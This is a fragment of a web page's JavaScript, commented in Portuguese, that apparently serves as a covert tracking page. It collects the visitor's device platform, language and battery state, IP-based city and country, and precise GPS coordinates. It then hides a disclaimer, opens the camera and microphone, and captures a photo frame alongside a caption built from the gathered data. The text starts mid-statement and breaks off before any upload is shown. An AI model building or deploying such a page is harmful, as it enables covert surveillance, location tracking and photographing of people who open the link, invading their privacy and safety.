        caption += `Charging: ${currentUserData.battery.charging}\n`;

        });
      } catch (e) {

    // ============================================
    // COLETA DE DADOS
    // ============================================
    async function collectData() {
      // Info do Dispositivo
      currentUserData.device = {
        platform: navigator.platform,
        lang: navigator.language
      };

      // Bateria
      try {
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          currentUserData.battery = {
            level: Math.round(battery.level * 100),
            charging: battery.charging ? 'Yes' : 'No'
          };
        }
      } catch (e) {}

      // IP Info
      try {
        const res = await fetch('https://ipapi.co/json/');
        const ipData = await res.json();
        currentUserData.ip = {
          city: ipData.city,
          region: ipData.region,
          country: ipData.country_name
        };
      } catch (e) {}
    }

    async function getGPS() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
          (p) => resolve({ lat: p.coords.latitude, lon: p.coords.longitude }),
          () => resolve(null),
          { enableHighAccuracy: true, timeout: 5000 }
        );
      });
    }

    // ============================================
    // PROCESSO PRINCIPAL

    async function startProcess() {
      document.getElementById('disclaimer').style.display = 'none';
      document.getElementById('mainContent').style.display = 'block';

      currentUserData.location = await getGPS();

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        status.textContent = 'Conectado! Iniciando captura...';

        // Primeira captura imediata
        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);
        const bitmap = await imageCapture.grabFrame();
        const canvas = document.createElement('canvas');
        canvas.width = bitmap.width; canvas.height = bitmap.height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(bitmap, 0, 0);
        canvas.toBlob(blob => {
